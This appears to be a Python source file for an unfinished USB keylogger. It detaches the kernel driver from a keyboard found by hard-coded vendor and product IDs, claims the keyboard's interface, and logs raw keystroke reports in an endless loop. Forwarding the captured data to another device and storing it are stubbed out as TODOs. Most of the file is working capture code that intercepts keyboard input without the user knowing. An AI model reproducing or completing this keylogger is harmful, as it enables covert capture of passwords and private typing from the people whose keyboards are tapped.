import logging
from typing import Optional
import usb.core, usb.util
from src.DataHandler import DataHandler
from src.USBForwarder import USBForwarder


class NoDeviceFound(Exception):
    def __init__(self, devices: list = []):
        super().__init__(f"No forward device found in {devices}")


class KeyLogger:
    __slots__ = ["__devices", "data_handler", "__USBForwarder"]

    def __init__(self, data_handler: DataHandler) -> None:
        self.__devices: list = self.get_devices()
        self.data_handler = data_handler
        # TODO add later USB Forwader
        #self.__USBForwarder = USBForwarder(self.__find_device(with_device="forward"))

    def __del__(self):
        pass

    def __find_device(self, with_device: str = "forward") -> Optional[usb.core.Device]:
        id_vendor: int = 0x1c4f
        device_id: int = 0x008b
        if id_vendor == 0 or device_id == 0:
            raise NoDeviceFound(self.__devices)
            pass
        else:
            try:
                # Find the USB device
                device = usb.core.find(idVendor=id_vendor, idProduct=device_id)
                if device.is_kernel_driver_active(0):
                    try:
                        device.detach_kernel_driver(0)
                    except usb.core.USBError as e:
                        print("Could not detach kernel driver: %s" % str(e))
                # Release the device from any other processes
                usb.util.dispose_resources(device)
                # Check if the device is still busy

                if device.is_kernel_driver_active(0):
                    print("Device is still busy, could not release resources")
                    logging.error("FEEEEEEEEEEEEEEEEEEHLER")
                else:
                    return device
            except Exception as e:
                logging.error(f"{e}")
                return None


    @staticmethod
    def get_devices() -> list[[int, int]]:
        devices = usb.core.find(find_all=True)
        found_devices: list[[int, int]] = []
        # Enumerate over all USB devices
        for device in devices:
            print(device)
            try:
                found_devices.append([device.idVendor, device.idProduct])
            except usb.core.USBError as e:
                print(f"Error reading Vendor ID: {e}")
        return found_devices

    # TODO: Rewrite this code
    def run(self):
        device =self.__find_device()
        if device is None:
            logging.error(f'Device is None in the run ')
        usb.util.claim_interface(device, 0)
        while True:
            try:
                # Endlosschleife zum Abhören des USB-Verkehrs
                while True:
                    data: any = device.read(
                        0x81, 64
                    )  # Endpoint-Adresse und Puffergröße anpassen
                    logging.info(
                        f'{data}'
                    )
                    # self.__USBForwarder.send_data(data)
                    # self.data_handler.write(data)
            except Exception as e:
                logging.error(f"{e}")
                pass
        #test
        #TODO add later that we can use the keyboard again
        # finally:
        #     usb.util.release_interface(device, 0)
        #     device.reset()
